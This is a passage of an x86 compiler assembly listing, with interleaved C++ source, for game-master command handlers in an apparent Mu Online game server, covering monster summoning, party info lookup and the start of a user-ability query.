  0017f	c7 85 e8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$4[ebp], 0
  00189	eb 0f		 jmp	 SHORT $LN4@SummonMons
$LN2@SummonMons:
  0018b	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _i$4[ebp]
  00191	83 c0 01	 add	 eax, 1
  00194	89 85 e8 fe ff
	ff		 mov	 DWORD PTR _i$4[ebp], eax
$LN4@SummonMons:
  0019a	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _i$4[ebp]
  001a0	3b 45 10	 cmp	 eax, DWORD PTR _nCount$[ebp]
  001a3	0f 8d 95 02 00
	00		 jge	 $LN3@SummonMons

; 4630 : 	{
; 4631 : 		UCHAR cSX = (BYTE)lpObj->X;

  001a9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001ac	8a 88 04 01 00
	00		 mov	 cl, BYTE PTR [eax+260]
  001b2	88 8d e7 fe ff
	ff		 mov	 BYTE PTR _cSX$3[ebp], cl

; 4632 : 		UCHAR cSY = (BYTE)lpObj->Y;

  001b8	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001bb	8a 88 06 01 00
	00		 mov	 cl, BYTE PTR [eax+262]
  001c1	88 8d e6 fe ff
	ff		 mov	 BYTE PTR _cSY$2[ebp], cl

; 4633 : 
; 4634 : 		int nResult = gObjAddMonster(lpObj->MapNumber);

  001c7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001ca	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  001d1	51		 push	 ecx
  001d2	e8 00 00 00 00	 call	 ?gObjAddMonster@@YAFH@Z	; gObjAddMonster
  001d7	83 c4 04	 add	 esp, 4
  001da	0f bf d0	 movsx	 edx, ax
  001dd	89 95 e0 fe ff
	ff		 mov	 DWORD PTR _nResult$1[ebp], edx

; 4635 : 		if( nResult >= 0 )

  001e3	83 bd e0 fe ff
	ff 00		 cmp	 DWORD PTR _nResult$1[ebp], 0
  001ea	0f 8c 49 02 00
	00		 jl	 $LN13@SummonMons

; 4636 : 		{
; 4637 : 			gObj[nResult].m_bGMSummon	= TRUE;

  001f0	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  001fa	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00200	c6 84 01 5c 1a
	00 00 01	 mov	 BYTE PTR [ecx+eax+6748], 1

; 4638 : 
; 4639 : 			gObj[nResult].m_PosNum		= -1;

  00208	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  00212	83 c9 ff	 or	 ecx, -1
  00215	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0021b	66 89 8c 02 0c
	02 00 00	 mov	 WORD PTR [edx+eax+524], cx

; 4640 : 			gObj[nResult].X				= cSX;

  00223	66 0f b6 85 e7
	fe ff ff	 movzx	 ax, BYTE PTR _cSX$3[ebp]
  0022b	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00235	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0023b	66 89 84 0a 04
	01 00 00	 mov	 WORD PTR [edx+ecx+260], ax

; 4641 : 			gObj[nResult].Y				= cSY;

  00243	66 0f b6 85 e6
	fe ff ff	 movzx	 ax, BYTE PTR _cSY$2[ebp]
  0024b	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00255	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0025b	66 89 84 0a 06
	01 00 00	 mov	 WORD PTR [edx+ecx+262], ax

; 4642 : 			gObj[nResult].MapNumber		= lpObj->MapNumber;

  00263	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  0026d	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00273	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  00276	8a 92 09 01 00
	00		 mov	 dl, BYTE PTR [edx+265]
  0027c	88 94 01 09 01
	00 00		 mov	 BYTE PTR [ecx+eax+265], dl

; 4643 : 			gObj[nResult].TX			= gObj[nResult].X;

  00283	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  0028d	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00297	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0029d	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  002a3	66 8b 84 06 04
	01 00 00	 mov	 ax, WORD PTR [esi+eax+260]
  002ab	66 89 84 0a 20
	01 00 00	 mov	 WORD PTR [edx+ecx+288], ax

; 4644 : 			gObj[nResult].TY			= gObj[nResult].Y;

  002b3	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  002bd	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  002c7	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  002cd	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  002d3	66 8b 84 06 06
	01 00 00	 mov	 ax, WORD PTR [esi+eax+262]
  002db	66 89 84 0a 22
	01 00 00	 mov	 WORD PTR [edx+ecx+290], ax

; 4645 : 			gObj[nResult].m_OldX		= gObj[nResult].X;

  002e3	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  002ed	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  002f7	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  002fd	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00303	66 8b 84 06 04
	01 00 00	 mov	 ax, WORD PTR [esi+eax+260]
  0030b	66 89 84 0a 1c
	01 00 00	 mov	 WORD PTR [edx+ecx+284], ax

; 4646 : 			gObj[nResult].m_OldY		= gObj[nResult].Y;

  00313	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  0031d	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00327	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0032d	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00333	66 8b 84 06 06
	01 00 00	 mov	 ax, WORD PTR [esi+eax+262]
  0033b	66 89 84 0a 1e
	01 00 00	 mov	 WORD PTR [edx+ecx+286], ax

; 4647 : 			gObj[nResult].StartX		= (BYTE)gObj[nResult].X;

  00343	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  0034d	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00357	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0035d	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00363	8a 84 06 04 01
	00 00		 mov	 al, BYTE PTR [esi+eax+260]
  0036a	88 84 0a 1a 01
	00 00		 mov	 BYTE PTR [edx+ecx+282], al

; 4648 : 			gObj[nResult].StartY		= (BYTE)gObj[nResult].Y;

  00371	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  0037b	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00385	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0038b	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00391	8a 84 06 06 01
	00 00		 mov	 al, BYTE PTR [esi+eax+262]
  00398	88 84 0a 1b 01
	00 00		 mov	 BYTE PTR [edx+ecx+283], al

; 4649 : 
; 4650 : 			gObj[nResult].Level		    = lpMonsterAttr->m_Level;

  0039f	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  003a9	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  003af	8b 95 ec fe ff
	ff		 mov	 edx, DWORD PTR _lpMonsterAttr$[ebp]
  003b5	66 8b 52 1c	 mov	 dx, WORD PTR [edx+28]
  003b9	66 89 94 01 a0
	00 00 00	 mov	 WORD PTR [ecx+eax+160], dx

; 4651 : 
; 4652 : 			gObj[nResult].m_Attribute	= MON_ATTR_SUMMONED;

  003c1	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  003cb	b9 3c 00 00 00	 mov	 ecx, 60			; 0000003cH
  003d0	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  003d6	66 89 8c 02 fe
	02 00 00	 mov	 WORD PTR [edx+eax+766], cx

; 4653 : 			gObj[nResult].MaxRegenTime	= 0;

  003de	69 85 e0 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _nResult$1[ebp], 7072
  003e8	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  003ee	c7 84 01 08 02
	00 00 00 00 00
	00		 mov	 DWORD PTR [ecx+eax+520], 0

; 4654 : 			gObj[nResult].Dir			= rand()%8;	//  

  003f9	e8 00 00 00 00	 call	 _rand
  003fe	25 07 00 00 80	 and	 eax, -2147483641	; 80000007H
  00403	79 05		 jns	 SHORT $LN15@SummonMons
  00405	48		 dec	 eax
  00406	83 c8 f8	 or	 eax, -8			; fffffff8H
  00409	40		 inc	 eax
$LN15@SummonMons:
  0040a	69 8d e0 fe ff
	ff a0 1b 00 00	 imul	 ecx, DWORD PTR _nResult$1[ebp], 7072
  00414	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0041a	88 84 0a 08 01
	00 00		 mov	 BYTE PTR [edx+ecx+264], al

; 4655 : 			gObjSetMonster(nResult, lpMonsterAttr->m_Index);

  00421	8b 85 ec fe ff
	ff		 mov	 eax, DWORD PTR _lpMonsterAttr$[ebp]
  00427	8b 08		 mov	 ecx, DWORD PTR [eax]
  00429	51		 push	 ecx
  0042a	8b 95 e0 fe ff
	ff		 mov	 edx, DWORD PTR _nResult$1[ebp]
  00430	52		 push	 edx
  00431	e8 00 00 00 00	 call	 ?gObjSetMonster@@YAHHH@Z ; gObjSetMonster
  00436	83 c4 08	 add	 esp, 8
$LN13@SummonMons:

; 4656 : 		}
; 4657 : 	}

  00439	e9 4d fd ff ff	 jmp	 $LN2@SummonMons
$LN3@SummonMons:

; 4658 : 
; 4659 : 	wsprintf(szMsg, "Result-SummonMonster(%s:%d)", lpMonsterAttr->m_Name, nCount);

  0043e	8b 45 10	 mov	 eax, DWORD PTR _nCount$[ebp]
  00441	50		 push	 eax
  00442	8b 8d ec fe ff
	ff		 mov	 ecx, DWORD PTR _lpMonsterAttr$[ebp]
  00448	83 c1 08	 add	 ecx, 8
  0044b	51		 push	 ecx
  0044c	68 00 00 00 00	 push	 OFFSET ??_C@_0BM@HPFGBCLO@Result?9SummonMonster?$CI?$CFs?3?$CFd?$CJ@
  00451	8d 95 f8 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  00457	52		 push	 edx
  00458	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  0045e	83 c4 10	 add	 esp, 16			; 00000010H

; 4660 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  00461	6a 01		 push	 1
  00463	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00466	8b 08		 mov	 ecx, DWORD PTR [eax]
  00468	51		 push	 ecx
  00469	8d 95 f8 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  0046f	52		 push	 edx
  00470	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00475	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@SummonMons:

; 4661 : }

  00478	5f		 pop	 edi
  00479	5e		 pop	 esi
  0047a	5b		 pop	 ebx
  0047b	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0047e	33 cd		 xor	 ecx, ebp
  00480	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00485	8b e5		 mov	 esp, ebp
  00487	5d		 pop	 ebp
  00488	c2 0c 00	 ret	 12			; 0000000cH
?_SummonMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBDH@Z ENDP ; CGMMng::_SummonMonster
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_GetPartyInfo@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z
_TEXT	SEGMENT
_lpPartyObj$1 = -292					; size = 4
_i$2 = -288						; size = 4
_number$ = -284						; size = 4
_nCount$ = -280						; size = 4
_pParty$ = -276						; size = 4
_szMsg$ = -272						; size = 256
_nIndex$ = -16						; size = 4
_lpTargetObj$ = -12					; size = 4
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_lpszName$ = 12						; size = 4
?_GetPartyInfo@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z PROC	; CGMMng::_GetPartyInfo, COMDAT
; _this$ = ecx

; 4567 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 64 01 00
	00		 sub	 esp, 356		; 00000164H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4568 : 	LPOBJECTSTRUCT lpTargetObj = NULL;

  00019	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR _lpTargetObj$[ebp], 0

; 4569 : 	int nIndex = -1;

  00020	c7 45 f0 ff ff
	ff ff		 mov	 DWORD PTR _nIndex$[ebp], -1

; 4570 : 	char szMsg[256];
; 4571 : 	ZeroMemory(szMsg, 256);

  00027	68 00 01 00 00	 push	 256			; 00000100H
  0002c	6a 00		 push	 0
  0002e	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00034	50		 push	 eax
  00035	e8 00 00 00 00	 call	 _memset
  0003a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4572 : 	
; 4573 : 	ERROR_RETURN(lpszName, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0003d	83 7d 0c 00	 cmp	 DWORD PTR _lpszName$[ebp], 0
  00041	75 1a		 jne	 SHORT $LN5@GetPartyIn
  00043	6a 01		 push	 1
  00045	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00048	8b 08		 mov	 ecx, DWORD PTR [eax]
  0004a	51		 push	 ecx
  0004b	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  00050	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00055	83 c4 0c	 add	 esp, 12			; 0000000cH
  00058	e9 b8 01 00 00	 jmp	 $LN1@GetPartyIn
$LN5@GetPartyIn:

; 4574 : 	
; 4575 : 	nIndex = gObjGetIndex( const_cast<LPSTR>(lpszName) );

  0005d	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  00060	50		 push	 eax
  00061	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  00066	83 c4 04	 add	 esp, 4
  00069	89 45 f0	 mov	 DWORD PTR _nIndex$[ebp], eax

; 4576 : 	ERROR_RETURN(nIndex > 0, GCServerMsgStringSend("Result-User Not Found", lpObj->m_Index, 1) );

  0006c	83 7d f0 00	 cmp	 DWORD PTR _nIndex$[ebp], 0
  00070	7f 1a		 jg	 SHORT $LN6@GetPartyIn
  00072	6a 01		 push	 1
  00074	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00077	8b 08		 mov	 ecx, DWORD PTR [eax]
  00079	51		 push	 ecx
  0007a	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@
  0007f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00084	83 c4 0c	 add	 esp, 12			; 0000000cH
  00087	e9 89 01 00 00	 jmp	 $LN1@GetPartyIn
$LN6@GetPartyIn:

; 4577 : 	ERROR_RETURN(gObj[nIndex].PartyNumber >= 0, GCServerMsgStringSend("Result-Party Not Found", lpObj->m_Index, 1) );

  0008c	69 45 f0 a0 1b
	00 00		 imul	 eax, DWORD PTR _nIndex$[ebp], 7072
  00093	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00099	83 bc 01 88 02
	00 00 00	 cmp	 DWORD PTR [ecx+eax+648], 0
  000a1	7d 1a		 jge	 SHORT $LN7@GetPartyIn
  000a3	6a 01		 push	 1
  000a5	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000a8	8b 08		 mov	 ecx, DWORD PTR [eax]
  000aa	51		 push	 ecx
  000ab	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@OLNBDHGL@Result?9Party?5Not?5Found@
  000b0	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000b5	83 c4 0c	 add	 esp, 12			; 0000000cH
  000b8	e9 58 01 00 00	 jmp	 $LN1@GetPartyIn
$LN7@GetPartyIn:

; 4578 : 
; 4579 : 	PARTY_STRUCT* pParty = &gParty.m_PartyS[gObj[nIndex].PartyNumber];

  000bd	69 45 f0 a0 1b
	00 00		 imul	 eax, DWORD PTR _nIndex$[ebp], 7072
  000c4	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  000ca	6b 94 01 88 02
	00 00 30	 imul	 edx, DWORD PTR [ecx+eax+648], 48
  000d2	81 c2 08 00 00
	00		 add	 edx, OFFSET ?gParty@@3VPartyClass@@A+8
  000d8	89 95 ec fe ff
	ff		 mov	 DWORD PTR _pParty$[ebp], edx

; 4580 : 	ERROR_RETURN(pParty, GCServerMsgStringSend("Result-Invalid Point", lpObj->m_Index, 1) );

  000de	75 1a		 jne	 SHORT $LN8@GetPartyIn
  000e0	6a 01		 push	 1
  000e2	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000e5	8b 08		 mov	 ecx, DWORD PTR [eax]
  000e7	51		 push	 ecx
  000e8	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@DHNHOHCA@Result?9Invalid?5Point@
  000ed	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000f2	83 c4 0c	 add	 esp, 12			; 0000000cH
  000f5	e9 1b 01 00 00	 jmp	 $LN1@GetPartyIn
$LN8@GetPartyIn:

; 4581 : 
; 4582 : 	GCServerMsgStringSend("Result-Party", lpObj->m_Index, 1);

  000fa	6a 01		 push	 1
  000fc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ff	8b 08		 mov	 ecx, DWORD PTR [eax]
  00101	51		 push	 ecx
  00102	68 00 00 00 00	 push	 OFFSET ??_C@_0N@KGMENDNJ@Result?9Party@
  00107	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0010c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4583 : 
; 4584 : 	int nCount = 0;

  0010f	c7 85 e8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _nCount$[ebp], 0

; 4585 : 	int number = -1;

  00119	c7 85 e4 fe ff
	ff ff ff ff ff	 mov	 DWORD PTR _number$[ebp], -1

; 4586 : 	for( int i=0; i<MAX_PARTYUSER; ++i )

  00123	c7 85 e0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$2[ebp], 0
  0012d	eb 0f		 jmp	 SHORT $LN4@GetPartyIn
$LN2@GetPartyIn:
  0012f	8b 85 e0 fe ff
	ff		 mov	 eax, DWORD PTR _i$2[ebp]
  00135	83 c0 01	 add	 eax, 1
  00138	89 85 e0 fe ff
	ff		 mov	 DWORD PTR _i$2[ebp], eax
$LN4@GetPartyIn:
  0013e	83 bd e0 fe ff
	ff 05		 cmp	 DWORD PTR _i$2[ebp], 5
  00145	0f 8d b3 00 00
	00		 jge	 $LN3@GetPartyIn

; 4587 : 	{
; 4588 : 		number = pParty->Number[i];

  0014b	8b 85 e0 fe ff
	ff		 mov	 eax, DWORD PTR _i$2[ebp]
  00151	8b 8d ec fe ff
	ff		 mov	 ecx, DWORD PTR _pParty$[ebp]
  00157	8b 54 81 04	 mov	 edx, DWORD PTR [ecx+eax*4+4]
  0015b	89 95 e4 fe ff
	ff		 mov	 DWORD PTR _number$[ebp], edx

; 4589 : 		if( number < 0 )

  00161	83 bd e4 fe ff
	ff 00		 cmp	 DWORD PTR _number$[ebp], 0
  00168	7d 02		 jge	 SHORT $LN9@GetPartyIn

; 4590 : 			continue;

  0016a	eb c3		 jmp	 SHORT $LN2@GetPartyIn
$LN9@GetPartyIn:

; 4591 : 
; 4592 : 		LPOBJECTSTRUCT lpPartyObj = &gObj[number];

  0016c	69 85 e4 fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _number$[ebp], 7072
  00176	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0017c	89 85 dc fe ff
	ff		 mov	 DWORD PTR _lpPartyObj$1[ebp], eax

; 4593 : 		if (lpPartyObj != NULL && lpPartyObj->Connected >= CSS_GAMEPLAYING)

  00182	74 75		 je	 SHORT $LN10@GetPartyIn
  00184	8b 85 dc fe ff
	ff		 mov	 eax, DWORD PTR _lpPartyObj$1[ebp]
  0018a	83 78 04 03	 cmp	 DWORD PTR [eax+4], 3
  0018e	7c 69		 jl	 SHORT $LN10@GetPartyIn

; 4594 : 		{
; 4595 : 			++nCount;

  00190	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  00196	83 c0 01	 add	 eax, 1
  00199	89 85 e8 fe ff
	ff		 mov	 DWORD PTR _nCount$[ebp], eax

; 4596 : 
; 4597 : 			strcat(szMsg, lpPartyObj->Name);

  0019f	8b 85 dc fe ff
	ff		 mov	 eax, DWORD PTR _lpPartyObj$1[ebp]
  001a5	83 c0 73	 add	 eax, 115		; 00000073H
  001a8	50		 push	 eax
  001a9	8d 8d f0 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  001af	51		 push	 ecx
  001b0	e8 00 00 00 00	 call	 _strcat
  001b5	83 c4 08	 add	 esp, 8

; 4598 : 			if (i==0)

  001b8	83 bd e0 fe ff
	ff 00		 cmp	 DWORD PTR _i$2[ebp], 0
  001bf	75 14		 jne	 SHORT $LN11@GetPartyIn

; 4599 : 				strcat(szMsg, "(Leader)");

  001c1	68 00 00 00 00	 push	 OFFSET ??_C@_08DHLCFGJM@?$CILeader?$CJ@
  001c6	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  001cc	50		 push	 eax
  001cd	e8 00 00 00 00	 call	 _strcat
  001d2	83 c4 08	 add	 esp, 8
$LN11@GetPartyIn:

; 4600 : 			if (pParty->Count > nCount)

  001d5	8b 85 ec fe ff
	ff		 mov	 eax, DWORD PTR _pParty$[ebp]
  001db	8b 08		 mov	 ecx, DWORD PTR [eax]
  001dd	3b 8d e8 fe ff
	ff		 cmp	 ecx, DWORD PTR _nCount$[ebp]
  001e3	7e 14		 jle	 SHORT $LN10@GetPartyIn

; 4601 : 				strcat(szMsg, ", ");

  001e5	68 00 00 00 00	 push	 OFFSET ??_C@_02KEGNLNML@?0?5@
  001ea	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  001f0	50		 push	 eax
  001f1	e8 00 00 00 00	 call	 _strcat
  001f6	83 c4 08	 add	 esp, 8
$LN10@GetPartyIn:

; 4602 : 		}
; 4603 : 	}

  001f9	e9 31 ff ff ff	 jmp	 $LN2@GetPartyIn
$LN3@GetPartyIn:

; 4604 : 
; 4605 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  001fe	6a 01		 push	 1
  00200	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00203	8b 08		 mov	 ecx, DWORD PTR [eax]
  00205	51		 push	 ecx
  00206	8d 95 f0 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  0020c	52		 push	 edx
  0020d	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00212	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@GetPartyIn:

; 4606 : }

  00215	5f		 pop	 edi
  00216	5e		 pop	 esi
  00217	5b		 pop	 ebx
  00218	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0021b	33 cd		 xor	 ecx, ebp
  0021d	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00222	8b e5		 mov	 esp, ebp
  00224	5d		 pop	 ebp
  00225	c2 08 00	 ret	 8
?_GetPartyInfo@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ENDP	; CGMMng::_GetPartyInfo
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_GetUserAbility@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z
_TEXT	SEGMENT
_nAttackDamage$1 = -276					; size = 4
_szMsg$ = -272						; size = 256
_nIndex$ = -16						; size = 4
_lpTargetObj$ = -12					; size = 4
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_lpszName$ = 12						; size = 4
?_GetUserAbility@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z PROC ; CGMMng::_GetUserAbility, COMDAT
; _this$ = ecx

; 4524 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 54 01 00
	00		 sub	 esp, 340		; 00000154H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4525 : 	LPOBJECTSTRUCT lpTargetObj = NULL;

  00019	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR _lpTargetObj$[ebp], 0

; 4526 : 	int nIndex = -1;

  00020	c7 45 f0 ff ff
	ff ff		 mov	 DWORD PTR _nIndex$[ebp], -1

; 4527 : 	char szMsg[256];
; 4528 : 	ZeroMemory(szMsg, 256);

  00027	68 00 01 00 00	 push	 256			; 00000100H
  0002c	6a 00		 push	 0
  0002e	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00034	50		 push	 eax
  00035	e8 00 00 00 00	 call	 _memset
  0003a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4529 : 
; 4530 : 	ERROR_RETURN(lpszName, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0003d	83 7d 0c 00	 cmp	 DWORD PTR _lpszName$[ebp], 0
  00041	75 1a		 jne	 SHORT $LN2@GetUserAbi
  00043	6a 01		 push	 1
  00045	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00048	8b 08		 mov	 ecx, DWORD PTR [eax]
  0004a	51		 push	 ecx
  0004b	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  00050	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
